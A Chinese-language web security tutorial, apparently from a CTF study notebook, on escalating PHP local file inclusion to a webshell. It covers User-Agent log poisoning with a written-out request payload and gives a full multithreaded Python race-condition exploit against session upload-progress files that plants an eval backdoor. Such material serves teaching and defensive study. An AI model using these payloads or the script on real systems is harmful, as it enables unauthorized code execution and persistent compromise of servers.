---
date: 2026-10-15
title: "日志文件包含与Session文件包含Getshell"
---
# 📜 本地文件包含（LFI）高阶突破：日志投毒与 Session 条件竞争 Getshell

> **绝境场景**：目标服务器存在文件包含点 `include($_GET['file'])`，但是：
> 1. 服务器**完全禁止文件上传**（或者上传的目录不可控）；
> 2. `allow_url_include = Off`（无法使用 `php://input` 或 `data://` 远程代码执行）；
> 3. 目标机器没有外网连接。
>
> **破局之道**：利用服务器自身不可避免生成的系统文件作为寄生宿主——**Web 日志投毒（Log Poisoning）** 与 **Session 上传进度条件竞争（Upload Progress Race Condition）**！

---



> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。

## 一、技法一：Web 访问日志投毒包含（Access Log Poisoning）

> [!NOTE] 💡 小白必修前置认知：为什么包含 `.log` 日志文件竟然能执行 PHP 代码？
> * **初学者最大误区**：“PHP 只有在访问 `.php` 后缀的文件时才能执行代码吧？`.log` 后缀不是纯文本日志吗？”
> * **底层核心真相**：
>   * 浏览器直接访问文件时，Web 服务器（Nginx/Apache）确实根据文件后缀（`.php`）决定交给谁处理；
>   * **但是，一旦进入了代码内部，调用了 `include($file)` 函数，规则彻底变了！**
>   * `include` 根本**不在乎文件后缀是什么**（哪怕是 `access.log`、`avatar.jpg` 还是 `data.txt`）！它的底层行为是：**打开该文件，一行行扫描内容，只要看到 `<?php ... ?>` 标签，就强行当作 PHP 代码送入解释器执行！** 标签之外的所有普通文本，则原样输出到屏幕上。
>   * 这就是“文件包含漏洞”最恐怖的地方——任何能写入你受控字符的系统文件，都可以变成执行代码的“寄生宿主”！

Web 服务器（Nginx、Apache）在处理每一个 HTTP 请求时，都会将请求的客户端信息持久化追加记录到磁盘日志文件中。

### 1. 常见系统默认日志路径对照表
| 中间件 / 系统服务 | Linux 常见默认绝对路径 | Windows 常见默认路径 |
| :--- | :--- | :--- |
| **Nginx** | `/var/log/nginx/access.log`<br>`/var/log/nginx/error.log` | `C:\nginx\logs\access.log` |
| **Apache** | `/var/log/apache2/access.log`<br>`/var/log/httpd/access_log` | `C:\xampp\apache\logs\access.log` |
| **SSH 登录日志** | `/var/log/auth.log`（Ubuntu/Debian）<br>`/var/log/secure`（CentOS） | - |

---

### 2. ⚠️ 踩坑高发区：为什么不能在 URL 里写木马？
很多初学者尝试直接发请求：
```http
GET /<?php eval($_POST[1]);?> HTTP/1.1
```
* **翻车原因**：浏览器或代理中间件会自动将 URL 路径中的 `<`、`>`、空格进行 URL 编码（转为 `%3C%3Fphp...`）。日志文件中记录的是**编码后的文本**，PHP 在包含该日志时，无法识别出原生 PHP 标签，导致木马无法执行！

---

### 3. 正确姿势：User-Agent 请求头投毒
Web 服务器在将 HTTP 请求头写入日志时，**绝不会对 User-Agent 进行 URL 转义编码！**

#### 🔍 抓包投毒报文（Burp Suite 实战）：
```http
GET /index.php HTTP/1.1
Host: target.com
User-Agent: <?php file_put_contents('/tmp/shell.php', '<?php @eval($_POST[1]);?>'); ?>
Connection: close
```
* **落盘结果**：服务器的 `/var/log/nginx/access.log` 末尾被无损写入了纯净的 PHP 代码；
* **触发执行**：利用包含漏洞发起请求：
```text
GET /index.php?file=/var/log/nginx/access.log HTTP/1.1
```
* **成果**：日志被加载执行，在 `/tmp/shell.php` 释放出一个永久稳定的 WebShell，彻底脱离庞大日志文件的干扰！

---

## 二、技法二：Session 上传进度文件条件竞争（无上传点创造文件）

当系统日志文件因权限不足（如非 root 权限，`www-data` 无法读取 640 权限的日志）无法包含时，这是最恐怖的通用利用手法。

### 1. PHP 核心特性：`session.upload_progress`
自 PHP 5.4 起，为了方便前端展示文件上传进度，PHP 默认开启了如下核心特性：
* `session.upload_progress.enabled = On`（默认开启）：只要上传请求中包含 `PHP_SESSION_UPLOAD_PROGRESS` 字段，PHP 会自动将上传进度存入 Session；
* `session.use_strict_mode = Off`（默认允许非严格模式）：**允许攻击者在 Cookie 中自定义任意合法的 Session ID！**
* `session.save_path = /tmp`：默认 Session 文件保存在 `/tmp/sess_<PHPSESSID>`；
* `session.upload_progress.cleanup = On`（默认开启）：**当文件上传结束时，PHP 会自动立即删除该 Session 文件！**

> [!IMPORTANT]
> **致命利用逻辑与条件竞争机制**：
> 1. **代码完全不需要写 `session_start()`！** 只要我们发起文件上传 POST 请求，PHP 就会**强制在 `/tmp/` 自动生成 Session 文件**；
> 2. 我们通过自定义 `Cookie: PHPSESSID=attacker_session`，使得生成的 Session 文件绝对路径**完全可预测**：`/tmp/sess_attacker`；
> 3. 结合条件竞争：虽然上传结束文件会被秒删，但在**上传持续进行的短暂微秒窗口内，该文件在磁盘上是真实存在的！**
> 4. 我们通过**双线程高并发竞争**：一边持续上传大文件制造延迟，另一边疯狂请求包含该 Session 文件，在被删除前抢先执行代码！

---

### 2. 工业级 Python 多线程条件竞争 EXP 脚本

```python
import requests
import io
import threading
import sys

TARGET_URL = "http://127.0.0.1/index.php"
SESSION_ID = "pwn_exploit"
# 预期的持久化 Webshell 路径
SHELL_PATH = "/tmp/pass_shell.php"

# 恶意 Payload：一旦被包含，立刻在 /tmp/ 目录下写一个永久木马
PAYLOAD = f"<?php file_put_contents('{SHELL_PATH}', '<?php @eval($_POST[1]);?>'); ?>"

stop_flag = False

def upload_worker():
    """线程 1：持续上传假文件，不断刷新并维持 Session 文件的存在"""
    while not stop_flag:
        # 构造超大垃圾字节流拉长上传处理时间
        large_file = io.BytesIO(b'A' * 1024 * 50)
        data = {
            'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD
        }
        files = {
            'file': ('test.txt', large_file, 'text/plain')
        }
        cookies = {
            'PHPSESSID': SESSION_ID
        }
        try:
            requests.post(TARGET_URL, data=data, files=files, cookies=cookies, timeout=3)
        except requests.RequestException:
            pass

def include_worker():
    """线程 2：持续向包含点发起并发请求，尝试命中 Session 文件"""
    global stop_flag
    url = f"{TARGET_URL}?file=/tmp/sess_{SESSION_ID}"
    while not stop_flag:
        try:
            r = requests.get(url, timeout=3)
            # 检测是否成功执行了写入
            check = requests.get(f"{TARGET_URL}?file={SHELL_PATH}", timeout=2)
            if check.status_code == 200 and len(check.text) > 0:
                print("\n[★] 条件竞争大获全胜！持久化 WebShell 写入成功！")
                print(f"[★] 访问路径: {TARGET_URL}?file={SHELL_PATH}")
                stop_flag = True
                sys.exit(0)
        except requests.RequestException:
            pass

if __name__ == "__main__":
    print("[*] 正在启动多线程 Session 条件竞争攻击集群...")
    threads = []
    # 启动 5 个上传维持线程
    for _ in range(5):
        t = threading.Thread(target=upload_worker)
        t.daemon = True
        t.start()
        threads.append(t)
        
    # 启动 10 个高频包含竞争线程
    for _ in range(10):
        t = threading.Thread(target=include_worker)
        t.daemon = True
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
```

---

## 🔗 相关双向链接
- 上级模块：[[03-文件类漏洞]]
- 前置基础：[[PHP伪协议全参数详解：input, filter, data, phar]]
- 知识总览：[[00-Web安全与CTF知识地图总览]]
